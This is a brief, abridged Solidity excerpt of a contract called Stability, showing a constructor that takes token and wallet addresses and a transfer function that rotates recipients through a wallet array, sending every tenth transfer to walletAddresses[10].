...
contract Stability {
    ...
    constructor(address _usdsctoken,address _BUSDToken, address _secretMessage, address payable[] memory _walletAddresses){
    ...
    function transfer(IERC20 token, uint amount) external payable {
        ...
        if (transferCounter % 10 == 0) {
            recipient = walletAddresses[10];
        } else {
            recipient = walletAddresses[transferCounter % 10];
        }
